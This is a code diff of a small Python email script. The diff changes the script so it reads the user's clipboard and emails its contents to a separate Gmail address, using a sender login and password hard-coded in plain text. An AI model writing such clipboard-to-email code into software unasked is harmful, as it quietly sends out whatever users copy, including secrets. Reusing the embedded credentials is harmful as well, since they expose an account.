@@ -1,5 +1,5 @@
-import sys
 import datetime
+from tkinter import Tk
 
 def send_email(user, pwd, recipient, subject, body):
     import smtplib
@@ -25,10 +25,7 @@ def send_email(user, pwd, recipient, subject, body):
         print("failed to send mail")
 
 if __name__ == "__main__":
-    if len(sys.argv) >= 2:
-        body = sys.argv[1]
-    else:
-        body = "Test"
+    body = Tk().clipboard_get()
     now = datetime.datetime.now()
     cur = now.strftime("%Y-%m-%d %H:%M:%S")
     send_email("jd.book.006@gmail.com", 'CBh}D"8n', 'collvey.veritas@gmail.com', 'Copied Text at ' + cur, body)
